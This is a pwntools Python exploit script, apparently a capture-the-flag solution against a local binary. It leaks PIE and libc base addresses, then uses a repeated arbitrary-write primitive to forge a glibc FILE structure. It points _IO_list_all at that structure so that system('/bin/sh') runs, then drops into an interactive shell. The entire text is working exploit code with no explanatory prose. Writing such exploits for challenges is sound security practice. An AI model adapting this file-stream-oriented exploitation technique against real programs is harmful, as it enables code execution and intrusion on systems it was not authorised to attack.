#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './app')
libc = ELF(exe.libc.path)

def write(addr, data):
    io.sendlineafter(b"> ", b"write")
    io.sendlineafter(b": 0x", hex(addr).encode())
    io.sendlineafter(b"(8 chars): ", data)
    io.sendlineafter(b"(64 chars): ", b"")

io = process('./app')
io.sendlineafter(b"> ", b"server")

io.recvuntil(b"0x")
pieBase = int(io.recvline().strip().decode()[:-1], 16) - exe.symbols['current_license']

io.recvuntil(b"0x")
libc.address = int(io.recvline().strip().decode()[:-1], 16) - libc.symbols['exit']

fake_wfile_addr = pieBase + 0x4210 - 0x20

write(pieBase + 0x4210, b"/bin/sh\x00".ljust(0x8, b"\x00"))
write(pieBase + 0x4210 + 0x18, p64(libc.symbols["system"]))
write(pieBase + 0x4210 + 0x88 + 1, p64(libc.address + 0x205700)[1:])
write(pieBase + exe.symbols['sent_mails'], p64(-1, sign=True))

write(pieBase + 0x4210 + 0xa0, p64(fake_wfile_addr))
write(pieBase + 0x4210 + 0xc0, p64(pieBase + 0x4210))
write(pieBase + 0x4210 + 0xd8, p64(libc.address + 0x202228 + 0x30))
write(pieBase + exe.symbols['sent_mails'], p64(-1, sign=True))

write(libc.symbols['_IO_list_all'], p64(pieBase + 0x4210))

io.interactive()
